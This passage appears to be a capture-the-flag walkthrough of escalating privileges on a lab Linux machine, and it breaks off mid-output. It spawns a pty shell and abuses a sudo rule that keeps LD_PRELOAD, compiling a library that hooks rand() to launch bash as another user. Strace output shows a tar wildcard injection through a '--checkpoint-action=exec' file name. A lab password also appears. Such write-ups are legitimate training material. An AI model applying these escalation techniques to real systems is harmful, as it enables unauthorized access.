+<h3 id="where-is-bryan">Where is bryan?</h3>
+<p>For the next part of the challenge we may need a real pty shell, Once more
+<a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentest monkey</a>
+will help us:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We go in the user directory (<code>cd</code>) and we see a file <code>debug.gpg</code>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat debug.gpg</span>
+<span class="code-line">-----BEGIN PGP SIGNED MESSAGE-----</span>
+<span class="code-line">Hash: SHA1</span>
+<span class="code-line"></span>
+<span class="code-line">Dude,</span>
+<span class="code-line"></span>
+<span class="code-line">I know you are trying to debug this stupid dice thing, so I figured the below</span>
+<span class="code-line">will be useful?</span>
+<span class="code-line"></span>
+<span class="code-line">[...]</span>
+<span class="code-line">__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &lt;unfinished ...&gt;</span>
+<span class="code-line">getenv(&quot;LD_PRELOAD&quot;)                                                                                          = nil</span>
+<span class="code-line">rand()                                                                                                        = 1804289383</span>
+<span class="code-line">__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22</span>
+<span class="code-line">__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290</span>
+<span class="code-line">+++ exited (status 0) +++Dice said: 1804289383</span>
+<span class="code-line">[...]</span>
+<span class="code-line"></span>
+<span class="code-line">Lemme know!</span>
+<span class="code-line"></span>
+<span class="code-line">- --</span>
+<span class="code-line">Sean</span>
+<span class="code-line"></code></pre></div>
+
+<p>We search for the dice program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>find / -name &#39;dice&#39; 2&gt;/dev/null</span>
+<span class="code-line">/usr/local/bin/dice</span>
+<span class="code-line"></code></pre></div>
+
+<p>This program simply roll a dice:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>/usr/local/bin/dice</span>
+<span class="code-line">Dice said: 1804289383</span>
+<span class="code-line"></code></pre></div>
+
+<p>An other useful information is that we can roll the dice as bryan:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sudo -l</span>
+<span class="code-line">[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898</span>
+<span class="code-line"></span>
+<span class="code-line">Matching Defaults entries for robin on this host:</span>
+<span class="code-line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS</span>
+<span class="code-line">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1</span>
+<span class="code-line">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE</span>
+<span class="code-line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY</span>
+<span class="code-line">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL</span>
+<span class="code-line">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, env_keep+=LD_PRELOAD,</span>
+<span class="code-line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User robin may run the following commands on this host:</span>
+<span class="code-line">    (bryan) /usr/local/bin/dice</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us put all the pieces together. We can run the program as bryan, we now that
+the program load the <code>LD_PRELOAD</code> environement variable.</p>
+<p>A simple google search lead us to
+<a href="http://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/">this article</a>
+and
+<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">this one</a>.
+So now we just need to write a shared library to replace <code>rand()</code> by <code>/bin/bash</code>
+run the program as bryan and we would get a shell as bryan.</p>
+<p>When testing the trick I ran into the following error:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so</span>
+<span class="code-line">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span>
+<span class="code-line"></code></pre></div>
+
+<p>We just need to add some variable to our user's PATH:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/game</span>
+<span class="code-line"></code></pre></div>
+
+<p>From there we we can compile the shared library and execute the dice program
+with it:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so</span>
+<span class="code-line">gcc -shared -fPIC unrandom.c -o unrandom.so</span>
+<span class="code-line">[robin@fII ~]$ LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice</span>
+<span class="code-line">LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice</span>
+<span class="code-line">42 baby</span>
+<span class="code-line"></code></pre></div>
+
+<p>We need to copy the <code>.so</code> to a location where bryan could read it like <code>/tmp/</code>.
+Now we can run the program as bryan and load the shared library:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">bryan</span><span class="w"> </span><span class="n">LD_PRELOAD</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">unrandom</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dice</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">robin</span><span class="p">:</span><span class="w"> </span><span class="mi">40373</span><span class="n">df4b7a1f413af61cf7fd06d03a565a51898</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="mi">42</span><span class="w"> </span><span class="n">baby</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We need to modify the code to get a shell:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c1">#include &lt;stdlib.h&gt;</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">getenv</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">){</span><span class="w"></span></span>
+<span class="code-line"><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span></span>
+<span class="code-line"><span class="p">}</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">rand</span><span class="p">(){</span><span class="w"></span></span>
+<span class="code-line"><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">);</span><span class="w"></span></span>
+<span class="code-line"><span class="k">return</span><span class="w"> </span><span class="mi">42</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="n">the</span><span class="w"> </span><span class="n">most</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">universe</span><span class="w"></span></span>
+<span class="code-line"><span class="p">}</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We compile it with <code>gcc</code> and run it as bryan:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">robin@fII ~</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">bryan</span><span class="w"> </span><span class="n">LD_PRELOAD</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">lol</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dice</span><span class="w"></span></span>
+<span class="code-line"><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">bryan</span><span class="w"> </span><span class="n">LD_PRELOAD</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">lol</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dice</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">robin</span><span class="p">:</span><span class="w"> </span><span class="mi">40373</span><span class="n">df4b7a1f413af61cf7fd06d03a565a51898</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">bryan@fII robin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h3 id="sean">sean</h3>
+<p>Now that we have a shell as bryan we may execute the <code>backup</code> script own by
+sean with the SUID set:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span></span>
+<span class="code-line"><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span></span>
+<span class="code-line"><span class="n">total</span><span class="w"> </span><span class="mi">1960</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">       </span><span class="mi">59</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">17</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">..</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span><span class="p">.</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">sean</span><span class="w"> </span><span class="n">bryan</span><span class="w">    </span><span class="mi">8830</span><span class="w"> </span><span class="n">Jul</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="k">backup</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">1107672</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="n">composer</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwx</span><span class="o">--</span><span class="n">x</span><span class="o">--</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="mi">8830</span><span class="w"> </span><span class="n">Jul</span><span class="w">  </span><span class="mi">2</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="n">dice</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="c1">---   1 root sean   866169 Aug 15  2015 restore</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us see what it does:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="k">backup</span><span class="w"></span></span>
+<span class="code-line"><span class="p">.</span><span class="o">/</span><span class="k">backup</span><span class="w"></span></span>
+<span class="code-line"><span class="o">*</span><span class="w"> </span><span class="n">Securing</span><span class="w"> </span><span class="n">environment</span><span class="w"></span></span>
+<span class="code-line"><span class="o">*</span><span class="w"> </span><span class="n">Performing</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">backup</span><span class="p">...</span><span class="w"></span></span>
+<span class="code-line"><span class="n">app</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">app</span><span class="o">/</span><span class="p">.</span><span class="n">gitignore</span><span class="w"></span></span>
+<span class="code-line"><span class="k">database</span><span class="p">.</span><span class="n">sqlite</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="p">.</span><span class="n">gitignore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="p">.</span><span class="n">gitignore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">framework</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="p">.</span><span class="n">gitignore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">logs</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">logs</span><span class="o">/</span><span class="p">.</span><span class="n">gitignore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">logs</span><span class="o">/</span><span class="n">lumen</span><span class="p">.</span><span class="nf">log</span><span class="w"></span></span>
+<span class="code-line"><span class="o">*</span><span class="w"> </span><span class="k">Backup</span><span class="w"> </span><span class="n">done</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>It might be something about WildCards on linux.  The following
+<a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">link</a>
+let us learn more about Linux WildCards vulnerability.</p>
+<p>Let us see what is used by the backup program with <code>strace</code> which available on
+the server let us try it to see the inside of the program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">bin</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">./</span><span class="n">backup</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">execve</span><span class="w"></span></span>
+<span class="code-line"><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">./</span><span class="n">backup</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">execve</span><span class="w"></span></span>
+<span class="code-line"><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;./backup&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;./backup&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=13&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_=/bin/strace&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/tmp&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">pid</span><span class="w">  </span><span class="mi">1779</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +</span><span class="se">\&quot;</span><span class="s2">%Y%m</span><span class="si">%d</span><span class="se">\&quot;</span><span class="s2">).tar.gz *;&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=13&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_=/bin/strace&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/tmp&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">pid</span><span class="w">  </span><span class="mi">1781</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/date&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/bin/date&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;+%Y%m</span><span class="si">%d</span><span class="s2">&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/share/nginx/serverchecker/storage&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=14&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_=/bin/date&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">pid</span><span class="w">  </span><span class="mi">1782</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/tar&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/bin/tar&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-zvcf&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;app&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;database.sqlite&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;framework&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;logs&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;shell.sh&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/share/nginx/serverchecker/storage&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=14&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span 